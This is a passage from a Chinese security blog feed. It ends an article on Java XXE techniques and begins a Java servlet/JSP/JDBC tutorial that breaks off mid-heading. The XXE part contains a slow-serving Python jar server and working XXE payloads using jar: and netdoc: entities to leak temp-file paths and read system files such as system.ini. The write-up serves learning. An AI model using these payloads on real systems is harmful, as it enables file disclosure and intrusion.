协议语法，<code>jar:{url}!/{entry}</code>，url是文件的路径，entry是想要解压出来的文件</p><p><strong>jar 协议处理文件的过程：</strong></p><ol><li>下载 jar/zip 文件到临时文件中</li><li>提取出我们指定的文件</li><li>删除临时文件</li></ol><p>那么延长服务器传递文件的时间，就可以延长临时文件存在的时间</p><p>server.py，这里在传输最后一个字符的时候会 sleep 30s</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">'localhost'</span> </span><br><span class="line">listen_port = <span class="number">9999</span> </span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarRequestHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        http_req = <span class="string">b''</span></span><br><span class="line">        print(<span class="string">'New connection:'</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b'\r\n\r\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                print(<span class="string">'Client req:\r\n'</span>,http_req.decode())</span><br><span class="line">                jf = open(jar_file, <span class="string">'rb'</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">'''HTTP/1.0 200 OK\r\n'''</span></span><br><span class="line">                <span class="string">'''Content-Type: application/java-archive\r\n\r\n'''</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">'ascii'</span>))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:<span class="number">-1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                print(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[<span class="number">-1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"get error at:"</span>+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'waiting for connection...'</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure><p>运行服务器，让其监听</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182027.png" alt="image-20200824182026676"></p><p>然后 xxe 结合 jar 协议</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"jar:http://localhost:9999/1.zip!/wm.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">convert</span>&gt;</span><span class="symbol">&amp;remote;</span><span class="tag">&lt;/<span class="name">convert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为 <code>1.zip</code> 中并不存在 <code>wm.php</code> 这个文件，所以可以在报错中看到临时文件的位置</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182311.png" alt="image-20200824182309774"></p><p>这里实际测试并不一定只能上传 <code>zip</code> 格式的文件，但因为 jar 协议会对文件进行解包操作，如果不上传 <code>zip</code> 格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次 <code>zip</code> 格式文件获取路径然后再上传其他文件。</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182435.png" alt="image-20200824182434415"></p><h3 id="3-2-netdoc-协议"><a href="#3-2-netdoc-协议" class="headerlink" title="3.2 netdoc 协议"></a>3.2 netdoc 协议</h3><p>Java 中 netdoc 协议可以替代 file 协议功能，读文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ELEMENT <span class="meta-keyword">creds</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"netdoc:///c:/windows/system.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时也可以列目录：</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824191609.png" alt="image-20200824191608338"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></p></li><li><p><a href="https://xz.aliyun.com/t/6829" target="_blank" rel="noopener">https://xz.aliyun.com/t/6829</a></p></li><li><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你深入理解 XXE 漏洞 - K0rz3n</a></p></li><li><p><a href="https://www.smi1e.top/dsada/" target="_blank" rel="noopener">https://www.smi1e.top/dsada/</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-XML-基础&quot;&gt;&lt;a href=&quot;#1-XML-基础&quot; class=&quot;headerlink&quot; title=&quot;1 XML 基础&quot;&gt;&lt;/a&gt;1 XML 基础&lt;/h2&gt;&lt;p&gt;XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据&lt;/p&gt;
&lt;h3 id=&quot;1-1-XML文档结构&quot;&gt;&lt;a href=&quot;#1-1-XML文档结构&quot; class=&quot;headerlink&quot; title=&quot;1.1 XML文档结构&quot;&gt;&lt;/a&gt;1.1 XML文档结构&lt;/h3&gt;&lt;p&gt;XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="XXE" scheme="https://jlkl.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>Java Web 基础</title>
    <link href="https://jlkl.github.io/2020/08/23/Java_02/"/>
    <id>https://jlkl.github.io/2020/08/23/Java_02/</id>
    <published>2020-08-23T07:23:13.000Z</published>
    <updated>2020-08-23T07:29:49.134Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Java-Web-目录结构"><a href="#1-Java-Web-目录结构" class="headerlink" title="1 Java Web 目录结构"></a>1 Java Web 目录结构</h2><p><img src="/2020/08/23/Java_02/20200816173242.png" alt="image-20200816173234356"></p><table><thead><tr><th align="center">目录</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">/test1_war_exploded</td><td align="center">Web应用根目录，存储 jsp 或 html 文件</td></tr><tr><td align="center">/test1_war_exploded/WEB-INF</td><td align="center">存放配置文件，不能直接访问</td></tr><tr><td align="center">/test1_war_exploded/WEB-INF/classes</td><td align="center">存放编译后的 class 文件</td></tr><tr><td align="center">/test1_war_exploded/WEB-INF/lib</td><td align="center">存放所需 jar 文件，如 JDBC 驱动的 jar 文件</td></tr></tbody></table><p>web.xml：servlet 、servlet mapping 以及其他配置</p><p>编译 servlet 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac  -sourcepath src -classpath D:\soft\server\apache-tomcat-9.0.37\lib\servlet-api.jar -d WEB-INF\classes src\mypack\DispatcherServlet.java</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-Servlet"><a href="#2-Servlet" class="headerlink" title="2 Servlet"></a>2 Servlet</h2><p>Servlet API 主要由两个 Java 包组成：<code>javax.servlet</code> 和 <code>javax.servlet.http</code> 。在 <code>javax.servlet</code> 中定义了 Servlet 接口以及相关通用接口和类。在 <code>javax.servlet.http</code> 主要定义了与 HTTP 协议相关的 HttpServlet 类、HttpServletRequest 接口和 HttpServletResponse 接口。</p><p><code>javax.servlet.Servlet</code> 接口主要定义了<code>servlet</code>基础生命周期方法：<code>init(初始化)</code>、<code>getServletConfig(配置)</code>、<code>service(服务)</code>、<code>destroy(销毁)</code>。</p><p><code>javax.servlet.http.HttpServlet</code>类继承于<code>javax.servlet.GenericServlet</code>，而<code>GenericServlet</code>又实现了<code>javax.servlet.Servlet</code>和<code>javax.servlet.ServletConfig</code>。而<code>HttpServlet</code>不仅实现了<code>servlet</code>的生命周期并通过封装<code>service</code>方法抽象出了<code>doGet/doPost/doDelete/doHead/doPut/doOptions/doTrace</code>方法用于处理来自客户端的不一样的请求方式，我们的Servlet只需要重写其中的请求方法或者重写<code>service</code>方法即可实现<code>servlet</code>请求处理。</p><p><strong>TestServlet示例代码:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 如果使用注解方式请取消@WebServlet注释并注释掉web.xml中TestServlet相关配置</span></span><br><span class="line"><span class="comment">//@WebServlet(name = "TestServlet", urlPatterns = &#123;"/TestServlet"&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">"Hello World~"</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-配置-Servlet-的两种方式"><a href="#2-1-配置-Servlet-的两种方式" class="headerlink" title="2.1 配置 Servlet 的两种方式"></a>2.1 配置 Servlet 的两种方式</h3><p>（1）web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>mypack.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/dispatcher<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（2）使用 Annotation 标注</p><p>在 Servlet3.0 之后( Tomcat7+)可以使用注解方式配置 Servlet 了,在任意的Java类添加<code>javax.servlet.annotation.WebServlet</code>注解即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name=<span class="string">"FontServlet1"</span>, urlPatterns=&#123;<span class="string">"/font1"</span>&#125;, initParams=&#123;<span class="meta">@WebInitParam</span>(name=<span class="string">"color"</span>,value=<span class="string">"blue"</span>),<span class="meta">@WebInitParam</span>(name=<span class="string">"size"</span>,value=<span class="string">"15"</span>)&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FontServlet1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span>&#123;……&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/23/Java_02/20200818112151.png" alt="image-20200818112122387"></p><h3 id="2-2-Request-amp-Response"><a href="#2-2-Request-amp-Response" class="headerlink" title="2.2 Request &amp; Response"></a>2.2 Request &amp; Response</h3><p><strong>HttpServletRequest 常用方法</strong></p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getParameter(String name)</td><td>获取请求中的参数，该参数是由name指定的</td></tr><tr><td>getParameterValues(String name)</td><td>返回请求中的参数值，该参数值是由name指定的</td></tr><tr><td>getRealPath(String path)</td><td>获取Web资源目录</td></tr><tr><td>getAttribute(String name)</td><td>返回name指定的属性值</td></tr><tr><td>getAttributeNames()</td><td>返回当前请求的所有属性的名字集合</td></tr><tr><td>getCookies()</td><td>返回客户端发送的Cookie</td></tr><tr><td>getSession()</td><td>获取session回话对象</td></tr><tr><td>getInputStream()</td><td>获取请求主题的输入流</td></tr><tr><td>getReader()</td><td>获取请求主体的数据流</td></tr><tr><td>getMethod()</td><td>获取发送请求的方式，如GET、POST</td></tr><tr><td>getParameterNames()</td><td>获取请求中所有参数的名称</td></tr><tr><td>getRemoteAddr()</td><td>获取客户端的IP地址</td></tr><tr><td>getRemoteHost()</td><td>获取客户端名称</td></tr><tr><td>getServerPath()</td><td>获取请求的文件的路径</td></tr></tbody></table><p><strong>HttpServletResponse 常用方法</strong></p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getWriter()</td><td>获取响应打印流对象</td></tr><tr><td>getOutputStream()</td><td>获取响应流对象</td></tr><tr><td>addCookie(Cookie cookie)</td><td>将指定的Cookie加入到当前的响应中</td></tr><tr><td>addHeader(String name,String value)</td><td>将指定的名字和值加入到响应的头信息中</td></tr><tr><td>sendError(int sc)</td><td>使用指定状态码发送一个错误到客户端</td></tr><tr><td>sendRedirect(String location)</td><td>发送一个临时的响应到客户端</td></tr><tr><td>setDateHeader(String name,long date)</td><td>将给出的名字和日期设置响应的头部</td></tr><tr><td>setHeader(String name,String value)</td><td>将给出的名字和值设置响应的头部</td></tr><tr><td>setStatus(int sc)</td><td>给当前响应设置状态码</td></tr><tr><td>setContentType(String ContentType)</td><td>设置响应的MIME类型</td></tr></tbody></table><h2 id="3-JSP-基础"><a href="#3-JSP-基础" class="headerlink" title="3 JSP 基础"></a>3 JSP 基础</h2><h3 id="3-1-JSP-指令"><a href="#3-1-JSP-指令" class="headerlink" title="3.1 JSP 指令"></a>3.1 JSP 指令</h3><p>JSP 指令用来设置和整个网页相关的属性，如编码方式和脚本语言等</p><p>一般语法：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="meta">%</span>@ 指令名 属性=<span class="string">"值"</span><span class="meta">%</span>&gt;</span><br></pre></td></tr></table></figure><ol><li>page 指令</li></ol><p>指定所用的编程语言，与 JSP 对应的 servlet 接口，所拓展的类以及导入的软件包等</p><p>常用属性：<a href="https://www.cnblogs.com/sharpest/p/10068832.html" target="_blank" rel="noopener">https://www.cnblogs.com/sharpest/p/10068832.html</a></p><ol start="2"><li><p>include 指令<code>&lt;%@ include file=&quot;filename&quot; %&gt;</code> 包含其他文件（静态包含）</p></li><li><p><code>&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</code> 引入标签库的定义</p></li></ol><h3 id="3-2-JSP-声明"><a href="#3-2-JSP-声明" class="headerlink" title="3.2 JSP 声明"></a>3.2 JSP 声明</h3><p>用于声明成员变量和方法</p><p>语法：<code>&lt;%! declaration;[declaration;]……%&gt;</code></p><p>example：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! <span class="keyword">int</span> v1=<span class="number">0</span>;%&gt;</span><br><span class="line">&lt;%! String v5=<span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> v6;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%! </span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">amethod</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> %&gt;</span><br></pre></td></tr></table></figure><h3 id="3-3-Java-程序片段（Scriptlet）"><a href="#3-3-Java-程序片段（Scriptlet）" class="headerlink" title="3.3 Java 程序片段（Scriptlet）"></a>3.3 Java 程序片段（Scriptlet）</h3><p>在 JSP 文件中，可以在 <code>&lt;%</code> 和 <code>%&gt;</code> 标记间嵌入任何有效的 Java 程序代码。</p><h3 id="3-4-JSP-表达式-EL"><a href="#3-4-JSP-表达式-EL" class="headerlink" title="3.4 JSP 表达式(EL)"></a>3.4 JSP 表达式(EL)</h3><p>传统 Java 表达式：<code>&lt;%=</code> 和 <code>%&gt;</code> 之间</p><p><a href="https://www.jb51.net/article/105314.htm" target="_blank" rel="noopener">https://www.jb51.net/article/105314.htm</a></p><h3 id="3-5-JSP-九大隐含对象"><a href="#3-5-JSP-九大隐含对象" class="headerlink" title="3.5 JSP 九大隐含对象"></a>3.5 JSP 九大隐含对象</h3><table><thead><tr><th>变量名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>pageContext</td><td>PageContext</td><td>当前页面共享数据，还可以获取其他8个内置对象</td></tr><tr><td>request</td><td>HttpServletRequest</td><td>客户端请求对象，包含了所有客户端请求信息</td></tr><tr><td>session</td><td>HttpSession</td><td>请求会话</td></tr><tr><td>application</td><td>ServletContext</td><td>全局对象，所有用户间共享数据</td></tr><tr><td>response</td><td>HttpServletResponse</td><td>响应对象，主要用于服务器端设置响应信息</td></tr><tr><td>page</td><td>Object</td><td>当前Servlet对象,<code>this</code></td></tr><tr><td>out</td><td>JspWriter</td><td>输出对象，数据输出到页面上</td></tr><tr><td>config</td><td>ServletConfig</td><td>Servlet的配置对象</td></tr><tr><td>exception</td><td>Throwable</td><td>异常对象</td></tr></tbody></table><h3 id="3-6-JSP-标准标签库-JSTL"><a href="#3-6-JSP-标准标签库-JSTL" class="headerlink" title="3.6 JSP 标准标签库(JSTL)"></a>3.6 JSP 标准标签库(JSTL)</h3><p>JSP标准标签库（JSTL）是一个JSP标签集合，它封装了JSP应用的通用核心功能。</p><p>JSTL支持通用的、结构化的任务，比如迭代，条件判断，XML文档操作，国际化标签，SQL标签。 除了这些，它还提供了一个框架来使用集成JSTL的自定义标签。</p><p><a href="https://www.runoob.com/jsp/jsp-jstl.html" target="_blank" rel="noopener">https://www.runoob.com/jsp/jsp-jstl.html</a></p><h2 id="4-JDBC"><a href="#4-JDBC" class="headerlink" title="4 JDBC"></a>4 JDBC</h2><p>JDBC连接数据库的一般步骤:</p><ol><li>注册驱动，<code>Class.forName(&quot;数据库驱动的类名&quot;)</code>。</li><li>获取连接，<code>DriverManager.getConnection(xxx)</code>。</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--首先导入一些必要的packages--&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</span><br><span class="line">&lt;!--告诉编译器使用SQL包--&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.sql.*"</span>%&gt;</span><br><span class="line">&lt;!--设置中文输出--&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html; charset=GB2312"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;dbaccess.jsp&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  Connection con;</span><br><span class="line">  Statement stmt;</span><br><span class="line">  ResultSet rs;</span><br><span class="line">  <span class="comment">//加载驱动程序，下面的代码加载MySQL驱动程序</span></span><br><span class="line">  Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">  <span class="comment">//注册MySQL驱动程序</span></span><br><span class="line">  DriverManager.registerDriver(<span class="keyword">new</span> com.mysql.jdbc.Driver());</span><br><span class="line">  <span class="comment">//用适当的驱动程序连接到数据库</span></span><br><span class="line">  String dbUrl =  <span class="string">"jdbc:mysql://localhost:3306/BookDB?useUnicode=true&amp;characterEncoding=GB2312&amp;useSSL=false"</span>;</span><br><span class="line">  String dbUser=<span class="string">"root"</span>;</span><br><span class="line">  String dbPwd=<span class="string">"root"</span>;</span><br><span class="line">  <span class="comment">//建立数据库连接</span></span><br><span class="line">  con = java.sql.DriverManager.getConnection(dbUrl,dbUser,dbPwd);</span><br><span class="line">  <span class="comment">//创建一个SQL声明</span></span><br><span class="line">  stmt = con.createStatement();</span><br><span class="line">  <span class="comment">//增加新记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"insert into BOOKS (ID,NAME,TITLE,PRICE) values('999','Tom','Tomcat Bible',44.5)"</span>);</span><br><span class="line">                                                       </span><br><span class="line">  <span class="comment">//查询记录</span></span><br><span class="line">  rs = stmt.executeQuery(<span class="string">"select ID,NAME,TITLE,PRICE from BOOKS"</span>);</span><br><span class="line">  <span class="comment">//输出查询结果</span></span><br><span class="line">  out.println(<span class="string">"&lt;table border=1 width=400&gt;"</span>);</span><br><span class="line">  <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">    String col1 = rs.getString(<span class="number">1</span>);</span><br><span class="line">    String col2 = rs.getString(<span class="number">2</span>);</span><br><span class="line">    String col3 = rs.getString(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">float</span> col4 = rs.getFloat(<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//打印所显示的数据</span></span><br><span class="line">    out.println(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span>+col1+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col2+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col3+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col4+<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  out.println(<span class="string">"&lt;/table&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//删除新增加的记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"delete from BOOKS where ID='999'"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//关闭数据库连接</span></span><br><span class="line">  rs.close();</span><br><span class="line">  stmt.close();</span><br><span class="line">  con.close();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//注销 JDBC Driver</span></span><br><span class="line">  Enumeration&lt;Driver&gt; drivers = DriverManager.getDrivers();</span><br><span class="line">  <span class="keyword">while</span>(drivers.hasMoreElements()) &#123;</span><br><span class="line">    DriverManager.deregisterDriver(drivers.nextElement());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;out.println(e.getMessage());&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="4-1-数据源（DataSource）"><a href="#4-1-数据源（DataSource）" class="headerlink" title="4.1 数据源（DataSource）"></a>4.1 